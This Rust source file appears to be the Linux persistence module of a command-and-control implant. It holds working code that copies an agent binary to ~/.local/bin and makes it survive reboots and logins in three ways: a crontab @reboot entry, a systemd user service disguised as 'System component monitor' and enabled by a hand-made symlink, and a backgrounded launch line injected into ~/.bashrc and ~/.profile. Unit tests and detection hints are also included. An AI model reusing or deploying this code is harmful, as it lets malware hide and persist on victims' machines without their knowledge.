// src/agent/persistence/linux.rs
//
// Linux persistence implementations.
//
// Crontab (T1053.003): Uses std::process::Command to read and write the
// user crontab — the cron file location (/var/spool/cron/crontabs/<user>)
// is mode 600 owned by root, so direct write requires root. Using the
// `crontab` binary is the only reliable non-root path on all distros.
//
// Systemd user service (T1543.002): Pure file I/O to
// ~/.config/systemd/user/<name>.service. Does NOT exec systemctl to enable
// — the unit is placed on disk and picked up on next login when
// `systemctl --user daemon-reload` is called naturally by the session.
// For immediate activation, the operator can issue `shell systemctl --user enable <name>`.
//
// Shell profile injection (T1546.004): Appends a background exec line to
// ~/.bashrc and ~/.profile inside a guard block that prevents duplicate
// execution.

#![cfg(target_os = "linux")]

use std::fs;
use std::io::Write;
use std::path::PathBuf;
use std::process::Command;

// ── Helpers ───────────────────────────────────────────────────────────

fn home_dir() -> Result<PathBuf, String> {
    std::env::var("HOME")
        .map(PathBuf::from)
        .map_err(|_| "HOME environment variable not set".to_string())
}

fn current_username() -> String {
    std::env::var("USER")
        .or_else(|_| std::env::var("LOGNAME"))
        .unwrap_or_else(|_| "unknown".to_string())
}

// ── Stable drop location ──────────────────────────────────────────────
//
// Copies `source` to ~/.local/bin/<name>, creating the directory if needed,
// and sets the executable bit. Returns the destination path. No-ops if
// source is already at the destination.

fn stable_drop(source: &str, name: &str) -> Result<String, String> {
    let bin_dir = home_dir()?.join(".local").join("bin");
    std::fs::create_dir_all(&bin_dir)
        .map_err(|e| format!("mkdir ~/.local/bin: {e}"))?;

    let dst = bin_dir.join(name);
    let dst_str = dst.to_string_lossy().into_owned();

    let already = std::fs::canonicalize(source)
        .ok()
        .zip(std::fs::canonicalize(&dst).ok())
        .map(|(a, b)| a == b)
        .unwrap_or(false);

    if !already {
        std::fs::copy(source, &dst)
            .map_err(|e| format!("stable_drop: {} → {}: {}", source, dst_str, e))?;

        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&dst, std::fs::Permissions::from_mode(0o755))
            .map_err(|e| format!("chmod {dst_str}: {e}"))?;
    }

    Ok(dst_str)
}



pub fn install_cron(binary_path: &str) -> Result<String, String> {
    let name = std::path::Path::new(binary_path)
        .file_name()
        .map(|n| n.to_string_lossy().into_owned())
        .unwrap_or_else(|| "agent".to_string());
    let stable = stable_drop(binary_path, &name)?;

    // Read current crontab (suppress error if none exists)
    let current = Command::new("crontab")
        .arg("-l")
        .output()
        .map_err(|e| format!("crontab -l failed: {e}"))?;

    let existing = String::from_utf8_lossy(&current.stdout);

    // Idempotency check
    if existing.contains(&stable) {
        return Ok(format!("[~] Cron entry already present for: {stable}"));
    }

    // Append @reboot entry and reload atomically via a temp file
    let new_content = if existing.trim().is_empty() {
        format!("@reboot {stable}\n")
    } else {
        let trimmed = existing.trim_end_matches('\n');
        format!("{trimmed}\n@reboot {stable}\n")
    };

    let tmp_path = format!("/tmp/.cron_{}", std::process::id());
    fs::write(&tmp_path, &new_content)
        .map_err(|e| format!("Write temp crontab failed: {e}"))?;

    let rc = Command::new("crontab")
        .arg(&tmp_path)
        .status()
        .map_err(|e| format!("crontab <tmpfile> failed: {e}"))?;

    let _ = fs::remove_file(&tmp_path);

    if !rc.success() {
        return Err(format!("crontab install exited {}", rc.code().unwrap_or(-1)));
    }

    // Verify
    let verify = Command::new("crontab")
        .arg("-l")
        .output()
        .map(|o| String::from_utf8_lossy(&o.stdout).contains(&stable))
        .unwrap_or(false);

    if verify {
        Ok(format!(
            "[+] Cron persistence installed\n    Copied: {} → {stable}\n    Entry:  @reboot {stable}\n    \
             Detection: crontab write (/var/spool/cron/crontabs/{}), auditd -w /var/spool/cron",
            binary_path,
            current_username()
        ))
    } else {
        Err("Cron install appeared to succeed but entry not found in verification".to_string())
    }
}

pub fn remove_cron(binary_path: &str) -> Result<String, String> {
    let current = Command::new("crontab")
        .arg("-l")
        .output()
        .map_err(|e| format!("crontab -l: {e}"))?;

    let existing = String::from_utf8_lossy(&current.stdout);
    let filtered: String = existing
        .lines()
        .filter(|line| !line.contains(binary_path))
        .map(|l| format!("{l}\n"))
        .collect();

    if filtered == existing.to_string() {
        return Ok(format!("[~] No cron entry found for: {binary_path}"));
    }

    let tmp_path = format!("/tmp/.cron_{}", std::process::id());
    fs::write(&tmp_path, &filtered)
        .map_err(|e| format!("Write temp crontab: {e}"))?;

    let rc = Command::new("crontab")
        .arg(&tmp_path)
        .status()
        .map_err(|e| format!("crontab <tmpfile>: {e}"))?;

    let _ = fs::remove_file(&tmp_path);

    if rc.success() {
        Ok(format!("[+] Removed cron entry for: {binary_path}"))
    } else {
        Err(format!("crontab removal exited {}", rc.code().unwrap_or(-1)))
    }
}

// ── T1543.002 — Systemd User Service ─────────────────────────────────

fn systemd_unit_dir() -> Result<PathBuf, String> {
    Ok(home_dir()?.join(".config").join("systemd").join("user"))
}

fn unit_file(name: &str) -> Result<PathBuf, String> {
    // Ensure the name ends with .service
    let fname = if name.ends_with(".service") {
        name.to_string()
    } else {
        format!("{name}.service")
    };
    Ok(systemd_unit_dir()?.join(fname))
}

fn build_unit(binary_path: &str, description: &str) -> String {
    // Type=forking causes systemd to background the process and track the
    // child PID. For a C2 agent that doesn't fork, Type=simple is correct.
    // Restart=on-failure provides auto-recovery without Type=always
    // (which would re-launch even after sys:die).
    format!(
        "[Unit]\nDescription={description}\nAfter=network.target\n\n\
         [Service]\nType=simple\nExecStart={binary_path}\nRestart=on-failure\nRestartSec=5\n\n\
         [Install]\nWantedBy=default.target\n"
    )
}

pub fn install_systemd(unit_name: &str, binary_path: &str) -> Result<String, String> {
    let stable = stable_drop(binary_path, unit_name)?;

    let dir = systemd_unit_dir()?;
    fs::create_dir_all(&dir)
        .map_err(|e| format!("mkdir -p {}: {e}", dir.display()))?;

    let unit_path = unit_file(unit_name)?;
    let contents  = build_unit(&stable, "System component monitor");

    fs::write(&unit_path, &contents)
        .map_err(|e| format!("Write unit file: {e}"))?;

    // Create symlink in wants/ so it's enabled without systemctl.
    let wants_dir = dir.join("default.target.wants");
    fs::create_dir_all(&wants_dir)
        .map_err(|e| format!("mkdir wants/: {e}"))?;

    let link = wants_dir.join(unit_path.file_name().unwrap());
    let _ = fs::remove_file(&link);
    std::os::unix::fs::symlink(&unit_path, &link)
        .map_err(|e| format!("Symlink into wants/: {e}"))?;

    Ok(format!(
        "[+] Systemd user service installed\n    Copied:  {} → {stable}\n    Unit:    {}\n    Symlink: {}\n    \
         Activate: systemctl --user enable {unit_name} && systemctl --user start {unit_name}\n    \
         Detection: inotify on ~/.config/systemd/user/, journald unit activation log",
        binary_path,
        unit_path.display(),
        link.display(),
    ))
}

pub fn remove_systemd(unit_name: &str) -> Result<String, String> {
    let unit_path  = unit_file(unit_name)?;
    let wants_dir  = systemd_unit_dir()?.join("default.target.wants");
    let wants_link = wants_dir.join(unit_path.file_name().unwrap());

    let mut removed = Vec::new();

    if wants_link.exists() || wants_link.symlink_metadata().is_ok() {
        fs::remove_file(&wants_link)
            .map_err(|e| format!("Remove symlink: {e}"))?;
        removed.push(format!("symlink {}", wants_link.display()));
    }

    if unit_path.exists() {
        fs::remove_file(&unit_path)
            .map_err(|e| format!("Remove unit file: {e}"))?;
        removed.push(format!("unit {}", unit_path.display()));
    }

    if removed.is_empty() {
        Ok(format!("[~] No systemd unit found for: {unit_name}"))
    } else {
        Ok(format!("[+] Removed: {}", removed.join(", ")))
    }
}

// ── T1546.004 — Shell Profile Injection ───────────────────────────────
//
// Injects a backgrounded launch line into ~/.bashrc and ~/.profile.
// The entry is wrapped in a sentinel-guarded block so:
//   1. Duplicate injection is idempotent
//   2. Removal is exact (sentinel delimiters, no regex-based line matching)

const SENTINEL_START: &str = "# --- rcm-persist-start ---";
const SENTINEL_END:   &str = "# --- rcm-persist-end ---";

fn profile_entry(binary_path: &str) -> String {
    format!(
        "{SENTINEL_START}\n\
         if [ -f \"{binary_path}\" ] && ! pgrep -x \"$(basename \"{binary_path}\")\" > /dev/null 2>&1; then\n  \
           \"{binary_path}\" &\nfi\n\
         {SENTINEL_END}\n"
    )
}

pub fn install_profile(binary_path: &str) -> Result<String, String> {
    let name = std::path::Path::new(binary_path)
        .file_name()
        .map(|n| n.to_string_lossy().into_owned())
        .unwrap_or_else(|| "agent".to_string());
    let stable = stable_drop(binary_path, &name)?;

    let home = home_dir()?;
    let targets = [home.join(".bashrc"), home.join(".profile")];
    let entry   = profile_entry(&stable);
    let mut installed = Vec::new();
    let mut errors    = Vec::new();

    for path in &targets {
        let existing = fs::read_to_string(path).unwrap_or_default();
        if existing.contains(SENTINEL_START) {
            installed.push(format!("{} (already present)", path.display()));
            continue;
        }
        match fs::OpenOptions::new().append(true).create(true).open(path) {
            Ok(mut f) => {
                if let Err(e) = write!(f, "\n{entry}") {
                    errors.push(format!("{}: {e}", path.display()));
                } else {
                    installed.push(path.display().to_string());
                }
            }
            Err(e) => errors.push(format!("{}: {e}", path.display())),
        }
    }

    if installed.is_empty() {
        return Err(format!("Profile injection failed: {}", errors.join("; ")));
    }

    let mut msg = format!(
        "[+] Profile persistence installed\n    Copied:  {} → {stable}\n    Files:   {}\n    \
         Detection: inotify on ~/.bashrc, ~/.profile; file modification timestamp",
        binary_path,
        installed.join(", ")
    );
    if !errors.is_empty() {
        msg.push_str(&format!("\n    Errors:  {}", errors.join("; ")));
    }
    Ok(msg)
}

pub fn remove_profile(binary_path: &str) -> Result<String, String> {
    let home = home_dir()?;
    let targets = [
        home.join(".bashrc"),
        home.join(".profile"),
    ];

    let mut cleaned = Vec::new();
    let mut errors  = Vec::new();

    for path in &targets {
        let content = match fs::read_to_string(path) {
            Ok(c) => c,
            Err(_) => continue,
        };

        if !content.contains(SENTINEL_START) {
            continue;
        }

        // Remove everything between (and including) the sentinel lines.
        let mut new_lines = Vec::new();
        let mut inside = false;
        for line in content.lines() {
            if line.trim() == SENTINEL_START {
                inside = true;
                continue;
            }
            if line.trim() == SENTINEL_END {
                inside = false;
                continue;
            }
            if !inside {
                new_lines.push(line);
            }
        }

        let new_content = new_lines.join("\n") + "\n";
        match fs::write(path, &new_content) {
            Ok(_) => cleaned.push(path.display().to_string()),
            Err(e) => errors.push(format!("{}: {e}", path.display())),
        }
    }

    if cleaned.is_empty() && errors.is_empty() {
        return Ok(format!("[~] No profile entry found for: {binary_path}"));
    }

    let mut msg = format!("[+] Removed profile entries from: {}", cleaned.join(", "));
    if !errors.is_empty() {
        msg.push_str(&format!("\n    Errors: {}", errors.join("; ")));
    }
    Ok(msg)
}


// ── Unit tests ─────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use std::os::unix::fs::PermissionsExt;

    // ── Isolation helpers ─────────────────────────────────────────────
    //
    // Tests that touch the filesystem need a private HOME to avoid
    // polluting the real user's ~/.local/bin, ~/.bashrc, etc.
    // HOME_MTX serialises those tests so env-var writes are safe.

    static HOME_MTX: std::sync::Mutex<()> = std::sync::Mutex::new(());

    struct TempHome {
        path: String,
        old: String,
        _guard: std::sync::MutexGuard<'static, ()>,
    }

    impl TempHome {
        fn new(tag: &str) -> Self {
            let guard = HOME_MTX.lock().unwrap_or_else(|p| p.into_inner());
            let path = format!(
                "/tmp/rcm_persist_test_{}_{tag}",
                std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap()
                    .subsec_nanos()
            );
            std::fs::create_dir_all(&path).unwrap();
            let old = std::env::var("HOME").unwrap_or_default();
            std::env::set_var("HOME", &path);
            TempHome { path, old, _guard: guard }
        }

        fn path(&self) -> &str { &self.path }
    }

    impl Drop for TempHome {
        fn drop(&mut self) {
            std::env::set_var("HOME", &self.old);
            std::fs::remove_dir_all(&self.path).ok();
        }
    }

    /// Write a minimal fake binary (ELF magic) into `dir/name`.
    fn fake_bin(dir: &str, name: &str) -> String {
        let path = format!("{dir}/{name}");
        std::fs::write(&path, b"\x7fELF fake binary").unwrap();
        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o644)).unwrap();
        path
    }

    // ── stable_drop ───────────────────────────────────────────────────

    #[test]
    fn stable_drop_copies_to_local_bin() {
        let h = TempHome::new("sd_copy");
        let src = fake_bin(h.path(), "src_agent");
        let dst = stable_drop(&src, "tgt_agent").unwrap();
        assert!(
            dst.contains(".local/bin/tgt_agent"),
            "Expected .local/bin/tgt_agent in path, got: {dst}"
        );
        assert!(std::path::Path::new(&dst).exists(), "Destination file must exist");
    }

    #[test]
    fn stable_drop_sets_executable_bit() {
        let h = TempHome::new("sd_chmod");
        let src = fake_bin(h.path(), "chmod_src");
        let dst = stable_drop(&src, "chmod_dst").unwrap();
        let mode = std::fs::metadata(&dst).unwrap().permissions().mode();
        assert_ne!(mode & 0o111, 0, "Executable bit not set (mode: {:o})", mode);
    }

    #[test]
    fn stable_drop_creates_bin_dir_when_missing() {
        let h = TempHome::new("sd_mkdir");
        let bin_dir = format!("{}/.local/bin", h.path());
        assert!(!std::path::Path::new(&bin_dir).exists(), "dir should not exist yet");
        let src = fake_bin(h.path(), "mkdir_src");
        stable_drop(&src, "mkdir_dst").unwrap();
        assert!(std::path::Path::new(&bin_dir).exists(), "dir was not created");
    }

    #[test]
    fn stable_drop_is_idempotent() {
        let h = TempHome::new("sd_idem");
        let src = fake_bin(h.path(), "idem_src");
        let dst1 = stable_drop(&src, "idem_dst").unwrap();
        let dst2 = stable_drop(&src, "idem_dst").unwrap();
        assert_eq!(dst1, dst2, "Second call must return same path");
    }

    #[test]
    fn stable_drop_noop_when_source_is_destination() {
        let h = TempHome::new("sd_noop");
        let bin_dir = format!("{}/.local/bin", h.path());
        std::fs::create_dir_all(&bin_dir).unwrap();
        let src = fake_bin(&bin_dir, "already_stable");
        // Source is already at the stable location — should not error
        let dst = stable_drop(&src, "already_stable").unwrap();
        assert_eq!(src, dst, "No-op: src and dst should match");
    }

    #[test]
    fn stable_drop_copies_content_faithfully() {
        let h = TempHome::new("sd_content");
        let src = format!("{}/payload", h.path());
        let payload = b"unique_test_payload_bytes";
        std::fs::write(&src, payload).unwrap();
        let dst = stable_drop(&src, "payload_copy").unwrap();
        let got = std::fs::read(&dst).unwrap();
        assert_eq!(got, payload, "Copied content must match source");
    }

    // ── build_unit ────────────────────────────────────────────────────

    #[test]
    fn build_unit_has_all_three_sections() {
        let u = build_unit("/bin/agent", "Desc");
        assert!(u.contains("[Unit]"));
        assert!(u.contains("[Service]"));
        assert!(u.contains("[Install]"));
    }

    #[test]
    fn build_unit_exec_start_equals_provided_path() {
        let u = build_unit("/path/to/my binary", "D");
        assert!(
            u.contains("ExecStart=/path/to/my binary"),
            "ExecStart must contain the exact path"
        );
    }

    #[test]
    fn build_unit_type_is_simple() {
        let u = build_unit("/bin/a", "D");
        assert!(u.contains("Type=simple"), "Must use Type=simple for a non-forking process");
    }

    #[test]
    fn build_unit_restart_is_on_failure() {
        let u = build_unit("/bin/a", "D");
        assert!(u.contains("Restart=on-failure"),
            "Must restart on failure, not always (sys:die would re-launch with Type=always)");
    }

    #[test]
    fn build_unit_wanted_by_default_target() {
        let u = build_unit("/bin/a", "D");
        assert!(u.contains("WantedBy=default.target"));
    }

    #[test]
    fn build_unit_description_is_set() {
        let u = build_unit("/bin/a", "My Custom Description");
        assert!(u.contains("Description=My Custom Description"));
    }

    #[test]
    fn build_unit_after_network_target() {
        let u = build_unit("/bin/a", "D");
        assert!(u.contains("After=network.target"),
            "Agent should start after network is up");
    }

    // ── unit_file name normalisation ──────────────────────────────────

    #[test]
    fn unit_file_adds_service_suffix() {
        let h = TempHome::new("uf_suffix");
        let p = unit_file("myunit").unwrap();
        assert!(
            p.to_string_lossy().ends_with("myunit.service"),
            "Should append .service, got: {}",
            p.display()
        );
    }

    #[test]
    fn unit_file_no_double_service_suffix() {
        let h = TempHome::new("uf_nodbl");
        let p = unit_file("myunit.service").unwrap();
        let s = p.to_string_lossy();
        assert!(
            s.ends_with("myunit.service") && !s.contains("myunit.service.service"),
            "Must not double-add .service, got: {s}"
        );
    }

    #[test]
    fn unit_file_is_inside_systemd_user_dir() {
        let h = TempHome::new("uf_loc");
        let p = unit_file("check").unwrap();
        assert!(
            p.to_string_lossy().contains(".config/systemd/user"),
            "Unit file must be under ~/.config/systemd/user, got: {}",
            p.display()
        );
    }

    // ── profile_entry ─────────────────────────────────────────────────

    #[test]
    fn profile_entry_has_sentinel_start() {
        let e = profile_entry("/bin/agent");
        assert!(e.contains("# --- rcm-persist-start ---"),
            "Must have start sentinel for idempotent install/removal");
    }

    #[test]
    fn profile_entry_has_sentinel_end() {
        let e = profile_entry("/bin/agent");
        assert!(e.contains("# --- rcm-persist-end ---"),
            "Must have end sentinel");
    }

    #[test]
    fn profile_entry_contains_binary_path() {
        let e = profile_entry("/my/special/agent");
        assert!(e.contains("/my/special/agent"),
            "Entry must reference the binary path");
    }

    #[test]
    fn profile_entry_guards_against_double_launch() {
        let e = profile_entry("/bin/agent");
        assert!(
            e.contains("pgrep") || e.contains("pidof"),
            "Entry must check if process is already running: {e}"
        );
    }

    #[test]
    fn profile_entry_launches_in_background() {
        let e = profile_entry("/bin/agent");
        // The `&` must be at end of the exec line, followed by a newline
        assert!(e.contains(" &\n"), "Process must be backgrounded with &");
    }

    #[test]
    fn profile_entry_checks_binary_exists_before_launch() {
        let e = profile_entry("/bin/agent");
        // Guard: if [ -f "..." ]
        assert!(e.contains("-f"), "Must check file exists before launching");
    }

    // ── install_systemd / remove_systemd lifecycle ────────────────────

    #[test]
    fn systemd_install_creates_unit_file() {
        let h = TempHome::new("sys_inst");
        let src = fake_bin(h.path(), "agent");
        let result = install_systemd("test-svc", &src);
        assert!(result.is_ok(), "install_systemd failed: {:?}", result.err());

        let unit = format!("{}/.config/systemd/user/test-svc.service", h.path());
        assert!(std::path::Path::new(&unit).exists(), "Unit file not created at {unit}");
    }

    #[test]
    fn systemd_install_unit_references_stable_path() {
        let h = TempHome::new("sys_stable");
        let src = fake_bin(h.path(), "orig_agent");
        install_systemd("stable-svc", &src).unwrap();

        let unit = format!("{}/.config/systemd/user/stable-svc.service", h.path());
        let content = std::fs::read_to_string(&unit).unwrap();
        let stable = format!("{}/.local/bin/stable-svc", h.path());
        assert!(
            content.contains(&stable),
            "Unit must reference stable path {stable}, got:\n{content}"
        );
    }

    #[test]
    fn systemd_install_creates_wants_symlink() {
        let h = TempHome::new("sys_wants");
        let src = fake_bin(h.path(), "agent");
        install_systemd("wants-svc", &src).unwrap();

        let link = format!(
            "{}/.config/systemd/user/default.target.wants/wants-svc.service",
            h.path()
        );
        let meta = std::fs::symlink_metadata(&link)
            .expect("wants symlink must exist");
        assert!(meta.file_type().is_symlink(), "Must be a symlink");
    }

    #[test]
    fn systemd_remove_deletes_unit_and_symlink() {
        let h = TempHome::new("sys_rm");
        let src = fake_bin(h.path(), "agent");
        install_systemd("rm-svc", &src).unwrap();

        let unit = format!("{}/.config/systemd/user/rm-svc.service", h.path());
        let link = format!(
            "{}/.config/systemd/user/default.target.wants/rm-svc.service",
            h.path()
        );
        assert!(std::path::Path::new(&unit).exists(), "Setup: unit must exist");

        remove_systemd("rm-svc").unwrap();

        assert!(!std::path::Path::new(&unit).exists(), "Unit file must be removed");
        assert!(std::fs::symlink_metadata(&link).is_err(), "Symlink must be removed");
    }

    #[test]
    fn systemd_remove_nonexistent_returns_graceful_ok() {
        let h = TempHome::new("sys_noop");
        let result = remove_systemd("definitely-does-not-exist");
        assert!(result.is_ok(), "Must not error for missing unit");
        assert!(
            result.unwrap().contains("[~]"),
            "Message must indicate nothing was found"
        );
    }

    #[test]
    fn systemd_install_idempotent_overwrite() {
        let h = TempHome::new("sys_idem");
        let src = fake_bin(h.path(), "agent");
        // Installing twice should not error — second call overwrites
        install_systemd("idem-svc", &src).unwrap();
        install_systemd("idem-svc", &src).unwrap();

        let unit = format!("{}/.config/systemd/user/idem-svc.service", h.path());
        assert!(std::path::Path::new(&unit).exists());
    }

    // ── install_profile / remove_profile lifecycle ────────────────────

    #[test]
    fn profile_install_writes_sentinel_to_bashrc() {
        let h = TempHome::new("prof_bash");
        let src = fake_bin(h.path(), "agent");
        install_profile(&src).unwrap();

        let bashrc = format!("{}/.bashrc", h.path());
        let content = std::fs::read_to_string(&bashrc).unwrap();
        assert!(content.contains("# --- rcm-persist-start ---"),
            ".bashrc must contain start sentinel");
        assert!(content.contains("# --- rcm-persist-end ---"),
            ".bashrc must contain end sentinel");
    }

    #[test]
    fn profile_install_writes_sentinel_to_profile() {
        let h = TempHome::new("prof_prof");
        let src = fake_bin(h.path(), "agent");
        install_profile(&src).unwrap();

        let profile = format!("{}/.profile", h.path());
        let content = std::fs::read_to_string(&profile).unwrap();
        assert!(content.contains("# --- rcm-persist-start ---"),
            ".profile must contain start sentinel");
    }

    #[test]
    fn profile_install_injects_stable_path() {
        let h = TempHome::new("prof_stable");
        let src = fake_bin(h.path(), "stabletest");
        install_profile(&src).unwrap();

        let bashrc = format!("{}/.bashrc", h.path());
        let content = std::fs::read_to_string(&bashrc).unwrap();
        let stable  = format!("{}/.local/bin/stabletest", h.path());

        assert!(
            content.contains(&stable),
            "Profile must reference stable path {stable}, not original {src}"
        );
    }

    #[test]
    fn profile_install_is_idempotent() {
        let h = TempHome::new("prof_idem");
        let src = fake_bin(h.path(), "agent");

        install_profile(&src).unwrap();
        install_profile(&src).unwrap(); // second call

        let bashrc = format!("{}/.bashrc", h.path());
        let content = std::fs::read_to_string(&bashrc).unwrap();
        let count = content.matches("# --- rcm-persist-start ---").count();
        assert_eq!(count, 1, "Sentinel must appear exactly once, got {count}");
    }

    #[test]
    fn profile_install_preserves_existing_content() {
        let h = TempHome::new("prof_preserve");
        let bashrc = format!("{}/.bashrc", h.path());
        let pre_existing = "export PATH=\"$HOME/.local/bin:$PATH\"\nalias ll='ls -la'\n";
        std::fs::write(&bashrc, pre_existing).unwrap();

        let src = fake_bin(h.path(), "agent");
        install_profile(&src).unwrap();

        let content = std::fs::read_to_string(&bashrc).unwrap();
        assert!(content.contains("alias ll='ls -la'"), "Pre-existing content must be preserved");
        assert!(content.contains("# --- rcm-persist-start ---"), "Sentinel must be appended");
    }

    #[test]
    fn profile_remove_strips_sentinel_block() {
        let h = TempHome::new("prof_rm");
        let bashrc = format!("{}/.bashrc", h.path());
        std::fs::write(&bashrc, "# existing\n").unwrap();

        let src = fake_bin(h.path(), "rm_agent");
        install_profile(&src).unwrap();
        assert!(std::fs::read_to_string(&bashrc).unwrap().contains("rcm-persist-start"),
            "Setup: sentinel must be present");

        let stable = format!("{}/.local/bin/rm_agent", h.path());
        remove_profile(&stable).unwrap();

        let after = std::fs::read_to_string(&bashrc).unwrap();
        assert!(!after.contains("rcm-persist-start"), "Sentinel must be removed");
    }

    #[test]
    fn profile_remove_preserves_content_outside_sentinel() {
        let h = TempHome::new("prof_surround");
        let bashrc = format!("{}/.bashrc", h.path());
        std::fs::write(&bashrc, "# line before\n").unwrap();

        let src = fake_bin(h.path(), "surround_agent");
        install_profile(&src).unwrap();

        // Append another line after the sentinel
        use std::io::Write;
        let mut f = std::fs::OpenOptions::new().append(true).open(&bashrc).unwrap();
        writeln!(f, "# line after").unwrap();
        drop(f);

        let stable = format!("{}/.local/bin/surround_agent", h.path());
        remove_profile(&stable).unwrap();

        let after = std::fs::read_to_string(&bashrc).unwrap();
        assert!(after.contains("# line before"), "Content before sentinel must survive");
        assert!(after.contains("# line after"),  "Content after sentinel must survive");
    }

    #[test]
    fn profile_remove_nonexistent_returns_graceful_ok() {
        let h = TempHome::new("prof_noop");
        let result = remove_profile("/no/such/agent");
        assert!(result.is_ok(), "Must not error when nothing to remove");
        assert!(result.unwrap().contains("[~]"), "Must signal nothing was removed");
    }
}


pub fn list() -> String {
    let mut out = Vec::new();

    // Crontab
    out.push("=== Crontab ===".to_string());
    match Command::new("crontab").arg("-l").output() {
        Ok(o) if o.status.success() => {
            let text = String::from_utf8_lossy(&o.stdout);
            let entries: Vec<_> = text.lines()
                .filter(|l| !l.trim_start().starts_with('#') && !l.trim().is_empty())
                .collect();
            if entries.is_empty() {
                out.push("  (empty)".into());
            } else {
                out.extend(entries.iter().map(|l| format!("  {l}")));
            }
        }
        _ => out.push("  (no crontab / crontab not available)".into()),
    }

    // Systemd user units
    out.push("\n=== Systemd User Units ===".to_string());
    if let Ok(dir) = systemd_unit_dir() {
        match fs::read_dir(&dir) {
            Ok(entries) => {
                let units: Vec<_> = entries
                    .flatten()
                    .filter(|e| e.path().extension().map(|x| x == "service").unwrap_or(false))
                    .map(|e| format!("  {}", e.file_name().to_string_lossy()))
                    .collect();
                if units.is_empty() {
                    out.push("  (none)".into());
                } else {
                    out.extend(units);
                }
            }
            Err(_) => out.push("  (directory does not exist)".into()),
        }
    }

    // Profile injection
    out.push("\n=== Shell Profile Injection ===".to_string());
    let home = home_dir().unwrap_or_else(|_| PathBuf::from("/"));
    for fname in &[".bashrc", ".profile"] {
        let path = home.join(fname);
        if let Ok(content) = fs::read_to_string(&path) {
            if content.contains(SENTINEL_START) {
                out.push(format!("  [injected] ~/{fname}"));
            }
        }
    }
    if out.last().map(|l| l.starts_with("===")).unwrap_or(false) {
        out.push("  (none)".into());
    }

    out.join("\n")
}
